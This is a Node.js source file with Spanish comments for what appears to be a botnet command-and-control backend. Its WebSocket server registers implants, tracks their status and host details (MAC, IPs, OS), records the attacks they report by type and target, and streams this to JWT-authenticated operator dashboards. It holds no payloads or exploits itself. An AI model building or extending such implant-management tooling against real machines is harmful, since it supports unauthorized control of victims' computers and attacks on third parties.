import { WebSocketServer } from 'ws';

import Implant from '../models/Implant_model.mjs';
import jwt from 'jsonwebtoken';
import { readLastLines, writeLog } from '../Utils/writeLog.mjs';


const webSocketsServer = async (httpServer, attacks_running, agents, status_connections={status_connections:[]}) => {
  try {
    const server = new WebSocketServer({ server: httpServer });
    const events = [];
    

    server.on('connection', (socket, request) => {
      const url = new URL(request.url, `http://${request.headers.host}`);
      const clientId = url.searchParams.get('id');


      // Si es Agent
      if (!clientId) {
        console.log("Client with no ID, closing..");
        socket.close();
        return;
      }

      

      if (agents.agents.has(clientId)) {
        writeLog(`Agent ${clientId} already connected replacing connection.`)
        agents.agents.get(clientId).terminate();
      }
      
      writeLog(` | Agent connected with ID: ${clientId}`)
      
      events.push();
      
      socket.isAlive = true;
      agents.agents.set(clientId, socket);
      
      //------------------------Datos proveniente de implantes-------------------------
      socket.on('message', (data) => {
        const data_parsed = JSON.parse(data);
          
        
          if(!data_parsed.error) {
            
            if(data_parsed.status === 'attack_completed') {
              // Filtrar para REMOVER el ataque completado
              // Si el mensaje del implante falla, el controller limpia el estado de running_attacks en el backend
               writeLog(` | Botnet ${data_parsed.attack_type} attack completed`)
               attacks_running.attacks = attacks_running.attacks.filter(a => 
                      a.attack_type !== data_parsed.attack_type || 
                      a.target !== data_parsed.target
                    ); 
                  } else if(data_parsed.status === 'attack_running') {
                    writeLog(` | Botnet ${data_parsed.attack_type} attack running`)
                    // Solo agregar si es un nuevo ataque
                  const exists = attacks_running.attacks.some(a => 
                      a.attack_type === data_parsed.attack_type && 
                      a.target === data_parsed.target
                  );
                  
                  if(!exists) {
                      attacks_running.attacks.push(data_parsed);
                  }
              }
          }
      });

      socket.on('pong', () => socket.isAlive = true);


      socket.on('close', () => {
        writeLog(` | Agent ${clientId} disconnected`)
        agents.agents.delete(clientId);
      });
    });

    const interval = setInterval(async () => {
      const db_clients = await Implant.find(); 

      
      const client_db_list = db_clients.map(x => x);



      client_db_list.forEach((c) => {
        /* console.log("db:",c.impl_id); */
        
        //Agents.agents status
/*         const ws = agents.agents.get(c.impl_id);
        if (ws) {
          if (ws.isAlive) {
            status_connections.status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          } else {
            status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          }
        } else {
          status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
        }
     */      
        const ws = agents.agents.get(c.impl_id);
        const arr_index = status_connections.status_connections.findIndex(i=>i.id === c.impl_id)

        if(arr_index !== -1){
          
          if (ws) {
            if (ws.isAlive) {
              status_connections.status_connections[arr_index] = { ...status_connections.status_connections[arr_index], status: 'active'};
            } else {
              status_connections.status_connections[arr_index] = { ...status_connections.status_connections[arr_index], status: 'inactive'};
            }
          } else {
            status_connections.status_connections[arr_index] = { ...status_connections.status_connections[arr_index], status: 'inactive'};
          } 
          
        }else{

           if (ws) {
            if (ws.isAlive) {
              status_connections.status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
            } else {
              status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
            }
          } else {
            status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
          }
        }
    
      }); 
      


    }, 2000);

    server.on("close", () => clearInterval(interval));


  } catch (error) {
    console.error('Error in websocket server', error);
    return false;
  }
};

const main_ws_server = async (httpServer, attacks_running, agents, status_connections={status_connections:[]}) => {
  try {
    const server = new WebSocketServer({ server: httpServer });
    const users = new Set();  // Set de users conectados (frontends)
    const events = [];
    

    server.on('connection', (socket, request) => {
      const url = new URL(request.url, `http://${request.headers.host}`);
      const clientId = url.searchParams.get('id');
      const rol = url.searchParams.get('rol');
      const token = url.searchParams.get('token');


      if (rol === 'user') {
        try {
          const decoded = jwt.verify(token, process.env.SEED); // valida y decodifica el JWT

          users.add(socket);

          socket.on('close', () => {
            users.delete(socket);
          });

          
        } catch (err) {
          console.log('Invalid JWT', err.message);
          socket.send('invalid')
          socket.close(); // cerrar conexión si el token es inválido
        }

        return;
      }


      
      
      // Enviar estados a todos los users conectados
      const payload = {
        data: status_connections.status_connections,
        botnet: attacks_running.attacks,
        events: readLastLines()
      };



      socket.on('close', () => {
        writeLog(` | Agent ${clientId} disconnected`)
        agents.agents.delete(clientId);
      });
    });

    const interval = setInterval(async () => {
      
      
      // Enviar estados a todos los users conectados
      const payload = {
        data: status_connections.status_connections,
        botnet: attacks_running.attacks,
        events: readLastLines()
      };

      
      // Reenviar a todos los users
      users.forEach(userSocket => {
        if (userSocket.readyState === userSocket.OPEN) {
          userSocket.send(JSON.stringify(payload));
        }
      });



    }, 2000);

    server.on("close", () => clearInterval(interval));


  } catch (error) {
    console.error('Error in websocket server', error);
    return false;
  }
};


export { webSocketsServer, main_ws_server };